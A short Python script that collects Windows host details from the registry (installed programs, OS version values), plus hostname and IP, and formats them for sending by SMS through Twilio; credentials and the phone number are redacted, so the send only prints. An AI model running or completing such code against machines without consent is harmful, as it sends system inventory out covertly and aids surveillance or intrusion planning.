from twilio.rest import Client
import winreg
import socket
import time

TEST_MODE = True


def main():
    global REG_HKLM
    REG_HKLM = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    pgms = ', '.join(get_all_programs())
    # printers = ', '.join(get_printers())
    host, ip = get_ip()
    osinfo = ', '.join(f'{k}: {v}' for k, v in get_os_info().items())
    if TEST_MODE:
        print(pgms)
        # print(printers)
        print(host, ip)
        print(osinfo)
    comprehensive_str = '\n'.join(['START-', pgms, host, ip])
    sendSMS(comprehensive_str)


def sendSMS(msg):
    # [AUTH CODE REDACTED]
    if len(msg) >= 1300:
        cache_msg = msg[1300:]
        msg = msg[:1300]
        too_long = True
    else: too_long = False
    if not TEST_MODE:
        # [PHONE NUMBER REDACTED]
        print('Sent:\n', msg)
    else:
        print('Fakely sent:\n', msg)
    if too_long: time.sleep(5);sendSMS(cache_msg)


def get_ip():
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    return host, ip


def get_all_programs():
    # Using registry
    reg_uninstall = winreg.OpenKey(REG_HKLM, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall')
    programs = []
    for i in range(2048):
        try:
            subkey_name = winreg.EnumKey(reg_uninstall, i)
            subkey = winreg.OpenKey(reg_uninstall, subkey_name)
            value = winreg.QueryValueEx(subkey, 'DisplayName')
            programs.append(value[0])
        except FileNotFoundError:
            continue
        except EnvironmentError:
            break

    return programs


def get_printers():  # Just for fun
    reg_printers = winreg.OpenKey(REG_HKLM, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers')
    printers = []
    for i in range(1024):
        try:
            subkey_name = winreg.EnumKey(reg_printers, i)
            printers.append(subkey_name)
        except EnvironmentError:
            break
    return printers


def get_os_info():
    reg_osinfo = winreg.OpenKey(REG_HKLM, r'SOFTWARE\Microsoft\Windows NT\CurrentVersion')
    result = {}
    for i in range(512):
        try:
            value_name, value_data, _ = winreg.EnumValue(reg_osinfo, i)
            result[value_name] = value_data
        except EnvironmentError:
            break
    del result['DigitalProductId'], result['DigitalProductId4']
    return result


if __name__ == '__main__':
    main()
